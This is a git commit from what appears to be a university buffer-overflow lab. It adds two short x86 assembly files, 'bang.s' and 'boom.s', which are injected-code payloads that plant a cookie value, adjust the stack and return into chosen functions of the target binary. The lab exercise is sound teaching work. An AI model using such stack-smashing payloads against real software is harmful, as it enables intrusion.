a877f271408a00446ea1177c5e8c937fe74a0a64
Rob Johansen <robert_johans22@hotmail.com>
2014-10-13 15:51:57 -0600

    Commit lab 3 completed through level 3.

---
+++ lab3/bang.s
@@ -0,0 +1,4 @@
+movl $0x119c97d9,0x804c1ec
+movl $0x08048c52,%ecx
+push %ecx
+ret
---
+++ lab3/boom.s
@@ -0,0 +1,8 @@
+movl $0x55683750,%ebp
+movl $0x55683724,%esp
+call *0x8048b30
+movl %eax,-0xc(%ebp)
+movl $0x119c97d9,%eax
+movl $0x08048d28,%ecx
+push %ecx
+ret
